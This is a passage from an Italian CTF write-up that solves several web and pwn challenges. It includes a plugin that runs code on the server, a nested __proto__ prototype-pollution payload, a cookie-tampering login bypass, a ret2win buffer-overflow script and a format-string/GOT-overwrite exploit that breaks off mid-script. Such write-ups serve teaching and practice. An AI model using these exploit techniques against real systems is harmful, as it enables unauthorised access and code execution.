+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;myplugin.plugin&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">bs4</span><span class="o">.</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s2">&#34;html.parser&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">,</span> <span class="n">alt</span><span class="o">=</span><span class="s2">&#34;My exploit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">widget</span> <span class="o">=</span> <span class="n">img</span><span class="p">[</span><span class="s2">&#34;src&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Widget uid:&#34;</span><span class="p">,</span> <span class="n">widget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;widget/&#39;</span> <span class="o">+</span> <span class="n">widget</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="plugin">Plugin<a hidden class="anchor" aria-hidden="true" href="#plugin">#</a></h4>
+<p><strong><code>init.py</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;python&#39;</span><span class="p">,</span> <span class="s1">&#39;../flag-uid-goes-here/init.py&#39;</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+</span></span></code></pre></div><p><strong><code>plugin_manifest.json</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;My exploit&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;1.0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;author&#34;</span><span class="p">:</span> <span class="s2">&#34;hecker&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;icon&#34;</span><span class="p">:</span> <span class="s2">&#34;icon.png&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="random-gallery">Random Gallery<a hidden class="anchor" aria-hidden="true" href="#random-gallery">#</a></h3>
+<h4 id="riepilogo-della-challenge">Riepilogo della challenge<a hidden class="anchor" aria-hidden="true" href="#riepilogo-della-challenge">#</a></h4>
+<p>Random Gallery è una web challenge basata su un semplice difetto di autenticazione.
+Visitando il sito si vede una pagina di login, ma non c’è alcuna opzione di registrazione—quindi sembra impossibile autenticarsi.</p>
+<p>Ispezionando i cookie del browser, si nota un cookie <code>logged_in</code> impostato a <code>false</code>.
+Se cambi manualmente questo valore in <code>true</code> e vai alla index (<code>/</code>), ottieni accesso al sito.</p>
+<p>Una volta dentro, esplora un po’ e ti imbatterai in un QR code:</p>
+<!-- raw HTML omitted -->
+<p>Scansiona il QR code per ottenere la flag.</p>
+<h3 id="theme-generator">Theme-Generator<a hidden class="anchor" aria-hidden="true" href="#theme-generator">#</a></h3>
+<p>Theme-Generator è una web app che consente agli utenti di caricare e unire preset JSON per personalizzare temi. L’applicazione include difese contro la prototype pollution e limita alcune azioni sensibili ai soli utenti admin.</p>
+<p>La prototype pollution è una vulnerabilità subdola e pericolosa che colpisce le applicazioni JavaScript. Si verifica quando un attacker può iniettare proprietà nel prototype globale di JavaScript (<code>Object.prototype</code>). Poiché tutti gli oggetti ereditano da questo prototype, inquinarlo può avere effetti molto ampi, potenzialmente consentendo escalation di privilegi o alterazioni inattese del comportamento dell’app.</p>
+<p>In questa challenge, gli sviluppatori hanno provato a difendersi bloccando eventuali chiavi di primo livello chiamate <code>__proto__</code>, <code>prototype</code> o <code>constructor</code> nei dati JSON in ingresso:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">k</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">([</span><span class="s2">&#34;__proto__&#34;</span><span class="p">,</span> <span class="s2">&#34;prototype&#34;</span><span class="p">,</span> <span class="s2">&#34;constructor&#34;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;blocked&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>A prima vista, sembra una difesa ragionevole. Tuttavia, il controllo ispeziona solo le chiavi di primo livello dell’oggetto inviato. Se un attacker annida una chiave malevola più in profondità, il filtro viene bypassato. Ad esempio, inviando il seguente payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;isAdmin&#34;</span><span class="p">:</span> <span class="kc">true</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span>
+</span></span></code></pre></div><p>si introduce di nascosto la proprietà <code>__proto__</code> nel prototype dell’oggetto, impostando <code>isAdmin</code> a <code>true</code> per tutti gli oggetti. Questo conferisce di fatto privilegi di admin all’attacker.</p>
+<p>Con accesso admin, è poi possibile effettuare una richiesta all’endpoint <code>/admin/flag</code> e recuperare la flag. Questa challenge evidenzia l’importanza di una validazione profonda quando si trattano oggetti forniti dall’utente in JavaScript, specialmente durante merge.</p>
+<h2 id="binary-exploitation-">Binary exploitation 🏴‍☠️<a hidden class="anchor" aria-hidden="true" href="#binary-exploitation-">#</a></h2>
+<h3 id="sigdance">Sigdance<a hidden class="anchor" aria-hidden="true" href="#sigdance">#</a></h3>
+<h4 id="analisi-del-codice">Analisi del codice<a hidden class="anchor" aria-hidden="true" href="#analisi-del-codice">#</a></h4>
+<p>La challenge consiste in due file C: <code>main.c</code> e <code>plugin.c</code>.</p>
+<h5 id="mainc"><code>main.c</code><a hidden class="anchor" aria-hidden="true" href="#mainc">#</a></h5>
+<p>Questo file contiene la logica principale del programma. Le sue azioni chiave sono:</p>
+<ul>
+<li>Imposta signal handler per <code>SIGALRM</code> e <code>SIGUSR1</code>.</li>
+<li>Usa <code>setitimer</code> per generare segnali <code>SIGALRM</code> a intervalli regolari (ogni 7 ms).</li>
+<li>Crea un nuovo thread che invia ripetutamente segnali <code>SIGUSR1</code> al processo principale (ogni 5 ms).</li>
+<li>Chiama <code>nanosleep</code> per 777 millisecondi.</li>
+<li>Carica dinamicamente la libreria condivisa <code>libcore.so</code> e chiama la funzione <code>verify</code>.</li>
+<li>Il programma legge l’input dell’utente e lo passa a <code>verify</code>. Se <code>verify</code> restituisce true, stampa la flag.</li>
+</ul>
+<h5 id="pluginc"><code>plugin.c</code><a hidden class="anchor" aria-hidden="true" href="#pluginc">#</a></h5>
+<p>Questo file viene compilato in <code>libcore.so</code> e contiene la funzione <code>verify</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">provided</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">uc</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">token</span> <span class="o">=</span> <span class="p">((</span><span class="n">ac</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">uc</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&amp;</span> <span class="mi">255u</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">provided</span> <span class="o">==</span> <span class="n">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>La funzione <code>verify</code> calcola un <code>token</code> basato su tre valori:</p>
+<ul>
+<li><code>ac</code>: il conteggio dei segnali <code>SIGALRM</code> ricevuti.</li>
+<li><code>uc</code>: il conteggio dei segnali <code>SIGUSR1</code> ricevuti.</li>
+<li><code>pid</code>: gli 8 bit meno significativi del process ID.</li>
+</ul>
+<p>Per risolvere la challenge, dobbiamo predire i valori di <code>ac</code> e <code>uc</code> e fornire il token corretto.</p>
+<h4 id="la-vulnerabilità">La vulnerabilità<a hidden class="anchor" aria-hidden="true" href="#la-vulnerabilità">#</a></h4>
+<p>La vulnerabilità principale risiede nell’interazione tra <code>nanosleep</code> e i segnali.</p>
+<p>La <code>main</code> chiama <code>nanosleep</code> per 777 ms. Tuttavia, non controlla il valore di ritorno di <code>nanosleep</code>. Secondo la man page di <code>nanosleep</code>, se il sonno è interrotto da un segnale, la funzione ritorna <code>-1</code> e imposta <code>errno</code> a <code>EINTR</code>.</p>
+<p>In questo programma, due segnali diversi vengono generati in parallelo:</p>
+<ol>
+<li><code>SIGALRM</code> è schedulato per scattare ogni 7 ms.</li>
+<li>Il thread separato invia <code>SIGUSR1</code> ogni 5 ms.</li>
+</ol>
+<p>Poiché <code>SIGUSR1</code> arriva per primo (dopo 5 ms), interrompe la chiamata a <code>nanosleep</code>. L’esecuzione prosegue immediatamente senza dormire per l’intera durata.</p>
+<p>Crucialmente, la riga che disabilita il timer <code>SIGALRM</code> si trova <em>dopo</em> la <code>nanosleep</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">setitimer</span><span class="p">(</span><span class="n">ITIMER_REAL</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="k">struct</span> <span class="n">itimerval</span><span class="p">){</span><span class="mi">0</span><span class="p">},</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span></code></pre></div><p>Dato che <code>nanosleep</code> viene interrotta prima che il primo <code>SIGALRM</code> (7 ms) possa scattare, il timer viene disabilitato e l’handler di <code>SIGALRM</code> non viene mai chiamato.</p>
+<p>Il programma quindi attende che il thread che invia <code>SIGUSR1</code> completi il suo loop, inviando in totale 13 segnali.</p>
+<p>Questo significa che i conteggi finali saranno sempre:</p>
+<ul>
+<li><code>ac = 0</code></li>
+<li><code>uc = 13</code></li>
+</ul>
+<h4 id="la-soluzione">La soluzione<a hidden class="anchor" aria-hidden="true" href="#la-soluzione">#</a></h4>
+<p>Con valori di <code>ac</code> e <code>uc</code> prevedibili, possiamo creare un semplice programma per calcolare il token richiesto.</p>
+<p><strong><code>solver.c</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -o solver solver.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;pid8&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">pid8</span> <span class="o">=</span> <span class="nf">strtoul</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">ac</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">uc</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">token</span> <span class="o">=</span> <span class="p">((</span><span class="n">ac</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">uc</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="n">pid8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong><code>solve.py</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;ctf.ac.upt.ro&#34;</span><span class="p">,</span> <span class="mi">9749</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;= &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;PID: </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;./solver&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">)],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></div><h3 id="baby-bof">baby-bof<a hidden class="anchor" aria-hidden="true" href="#baby-bof">#</a></h3>
+<p><strong>baby-bof</strong> è una pwn challenge per principianti che introduce una delle vulnerabilità più classiche: il <strong>Buffer Overflow</strong>.</p>
+<h4 id="panoramica-della-challenge">Panoramica della challenge<a hidden class="anchor" aria-hidden="true" href="#panoramica-della-challenge">#</a></h4>
+<p>Il codice decompilato (es. da IDA) mostra che l’eseguibile legge <code>0x100</code> byte in un buffer di soli 64 byte:</p>
+<p><img alt="Decompiled code showing buffer overflow" loading="lazy" src="/images/babybof.png"></p>
+<p>Questo permette di scrivere oltre la fine del buffer e sovrascrivere lo <em>stack</em>, incluso il return address. In questo modo possiamo reindirizzare l’esecuzione a qualsiasi funzione vogliamo—nel nostro caso, la funzione <code>win()</code>.
+Questa tecnica è comunemente chiamata <strong>ret2win</strong>.
+Per maggiori dettagli, vedi <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win">questa guida</a>.</p>
+<h4 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h4>
+<p>Ecco lo script di exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9806</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        b rww
+</span></span></span><span class="line"><span class="cl"><span class="s1">        c
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 64 bytes buffer + 8 bytes saved RBP = 72 bytes per raggiungere il return address</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">win</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><strong>Spiegazione:</strong></p>
+<ul>
+<li>Il payload overflowa il buffer e sovrascrive il return address con l’indirizzo di <code>win()</code>.</li>
+<li>Lo script funziona in locale, con GDB o in remoto.</li>
+</ul>
+<h3 id="fini">fini<a hidden class="anchor" aria-hidden="true" href="#fini">#</a></h3>
+<p><strong>fini</strong> è il primo task pwn davvero impegnativo della serie. Qui dobbiamo sfruttare una vulnerabilità più avanzata nota come <strong>format string bug</strong>.</p>
+<h4 id="individuare-la-vulnerabilità">Individuare la vulnerabilità<a hidden class="anchor" aria-hidden="true" href="#individuare-la-vulnerabilità">#</a></h4>
+<p>La vulnerabilità è evidente se conosci i format string bug.
+Nel codice decompilato (vedi immagine), il programma chiama <code>printf()</code> <strong>senza</strong> specificare una format string, tipo <code>%s</code>:</p>
+<p><img alt="Decompiled code showing vulnerable printf" loading="lazy" src="/images/fini.png"></p>
+<p>Questo significa che l’input dell’utente viene passato direttamente a <code>printf</code>, permettendoci di controllare la format string e di leakare valori dallo stack o scrivere in memoria arbitraria.</p>
+<p>Inoltre, il programma offre una funzionalità che permette di scrivere qualsiasi valore in qualunque indirizzo—utile per l’exploit.</p>
+<h4 id="sfruttare-la-vulnerabilità">Sfruttare la vulnerabilità<a hidden class="anchor" aria-hidden="true" href="#sfruttare-la-vulnerabilità">#</a></h4>
+<p>Poiché <code>printf</code> è chiamata senza format string, possiamo inviare i nostri specifier. Ad esempio, inviando <code>%p</code> verrà stampato un indirizzo dello stack.
+Se inviamo un payload come <code>%p.%p.%p.%p.%p.%p.%p.%p.</code>, il programma stamperà diversi indirizzi dello stack in ordine, separati da punti.
+Questo aiuta a visualizzare il layout dello stack e a trovare quale offset corrisponde a valori interessanti (come il return address o i function pointer).
+Puoi aumentare il numero di <code>%p</code> per stampare più valori, o usare GDB per ispezionare lo stack e contare quanti <code>%p</code> servono per raggiungere un valore specifico.</p>
+<p>Sperimentando, scopriamo che <code>%50$p</code> leaka l’indirizzo di <code>main</code>.
+Questo ci permette di calcolare la base dell’eseguibile (PIE).</p>
+<p>Poi usiamo la funzione di write-anywhere del programma per sovrascrivere la voce <strong>GOT</strong> di <code>printf</code> con l’indirizzo di <code>win()</code>.
+In questo modo, quando <code>printf</code> verrà chiamata di nuovo, in realtà salterà a <code>win()</code> e ci darà la flag.</p>
+<h4 id="script-di-exploit">Script di exploit<a hidden class="anchor" aria-hidden="true" href="#script-di-exploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9777</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        b main
+</span></span></span><span class="line"><span class="cl"><span class="s1">        c
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak dell’indirizzo di main tramite la format string vulnerability</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;%50$p&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;, &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Main address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Calcolo della base PIE</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">main</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">main</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Base address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Usa la funzione del programma per sovrascrivere printf@GOT con win()</span>
